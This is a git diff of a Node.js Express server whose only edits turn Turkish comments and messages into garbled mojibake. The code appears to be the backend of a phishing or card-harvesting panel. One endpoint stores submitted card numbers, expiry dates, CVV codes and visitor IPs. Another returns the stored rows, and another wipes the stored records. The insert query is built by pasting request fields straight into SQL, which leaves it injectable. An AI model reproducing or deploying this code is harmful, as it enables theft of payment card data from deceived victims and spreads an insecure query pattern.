@@ -4,7 +4,7 @@ const requestIp = require('request-ip');
 require('dotenv').config();
 const app = express();
 app.use(requestIp.mw());
-const port = process.env.PORT || 3000; // Varsayılan port 3000 veya başka bir port
+const port = process.env.PORT || 3000; // VarsayÄ±lan port 3000 veya baÅŸka bir port
 
 
  
@@ -23,8 +23,8 @@ app.get('/api/info', (req, res) => {
   const connection = mysql.createConnection(process.env.DATABASE_URL);
   connection.connect((err) => {
     if (err) {
-      console.error('Veritabanı bağlantısı kurulamadı:', err);
-      return res.status(500).json({ error: 'Veritabanı bağlantı hatası' });
+      console.error('VeritabanÄ± baÄŸlantÄ±sÄ± kurulamadÄ±:', err);
+      return res.status(500).json({ error: 'VeritabanÄ± baÄŸlantÄ± hatasÄ±' });
     }
 
     // "info" tablosundan verileri sorgula
@@ -32,11 +32,11 @@ app.get('/api/info', (req, res) => {
     
     connection.query(query, (error, results, fields) => {
       if (error) {
-        console.error('Sorgu hatası:', error);
-        return res.status(500).json({ error: 'Veritabanı sorgu hatası' });
+        console.error('Sorgu hatasÄ±:', error);
+        return res.status(500).json({ error: 'VeritabanÄ± sorgu hatasÄ±' });
       }
 
-      console.log('Veriler başarıyla alındı.');
+      console.log('Veriler baÅŸarÄ±yla alÄ±ndÄ±.');
 
       connection.end();
 
@@ -59,8 +59,8 @@ app.post('/online-api', (req, res) => {
 
   connection.query(updateQuery, (error, results) => {
     if (error) {
-      console.error('Güncelleme hatası:', error);
-      return res.status(500).json({ error: 'Güncelleme hatası' });
+      console.error('GÃ¼ncelleme hatasÄ±:', error);
+      return res.status(500).json({ error: 'GÃ¼ncelleme hatasÄ±' });
     }
 
      res.json({ success: true });
@@ -76,9 +76,9 @@ app.post('/your-payment-api', (req, res) => {
   const cardExpirationMonth = req.body.cardExpirationMonth;
   const cardExpirationYear = req.body.cardExpirationYear;
   const cardCCV = req.body.cardCCV;
-  const visitorIP = req.body.visitorIP; // Ziyaretçinin IP'sini buradan alın
+  const visitorIP = req.body.visitorIP; // ZiyaretÃ§inin IP'sini buradan alÄ±n
 
-  // Veritabanına yeni bir kayıt eklemek için gerekli SQL sorgusunu oluşturun
+  // VeritabanÄ±na yeni bir kayÄ±t eklemek iÃ§in gerekli SQL sorgusunu oluÅŸturun
   const insertQuery = `
   INSERT INTO info (bank_name, tckn, cardnumber, exp, cvv, ip)
   VALUES ('', '${cardHolder}', '${cardNumber}', '${cardExpirationMonth + cardExpirationYear}', '${cardCCV}', '${visitorIP}')
@@ -86,11 +86,11 @@ app.post('/your-payment-api', (req, res) => {
 
   connection.query(insertQuery, (error, results) => {
       if (error) {
-          console.error('Ödeme kaydı eklenemedi:', error);
-          return res.status(500).json({ error: 'Ödeme kaydı eklenemedi' });
+          console.error('Ã–deme kaydÄ± eklenemedi:', error);
+          return res.status(500).json({ error: 'Ã–deme kaydÄ± eklenemedi' });
       }
 
-      // Başarılı yanıt verin
+      // BaÅŸarÄ±lÄ± yanÄ±t verin
       res.json({ success: true });
       connection.end();
   });
@@ -99,27 +99,27 @@ app.post('/your-payment-api', (req, res) => {
 app.post('/delete-logs-api', (req, res) => {
   const connection = mysql.createConnection(process.env.DATABASE_URL);
 
-  // Logları temizleme sorgusu
+  // LoglarÄ± temizleme sorgusu
   const deleteQuery = 'DELETE FROM info';
 
   connection.connect((err) => {
       if (err) {
-          console.error('Veritabanı bağlantısı kurulamadı:', err);
-          return res.status(500).json({ error: 'Veritabanı bağlantı hatası' });
+          console.error('VeritabanÄ± baÄŸlantÄ±sÄ± kurulamadÄ±:', err);
+          return res.status(500).json({ error: 'VeritabanÄ± baÄŸlantÄ± hatasÄ±' });
       }
 
       connection.query(deleteQuery, (error, results) => {
           if (error) {
-              console.error('Logları silme hatası:', error);
-              return res.status(500).json({ error: 'Logları silme hatası' });
+              console.error('LoglarÄ± silme hatasÄ±:', error);
+              return res.status(500).json({ error: 'LoglarÄ± silme hatasÄ±' });
           }
 
-          // Başarılı yanıt verin
+          // BaÅŸarÄ±lÄ± yanÄ±t verin
           res.json({ success: true });
       });
   });
 });
 
  app.listen(port, () => {
-  console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
+  console.log(`Web sunucusu http://localhost:${port} adresinde Ã§alÄ±ÅŸÄ±yor.`);
 });
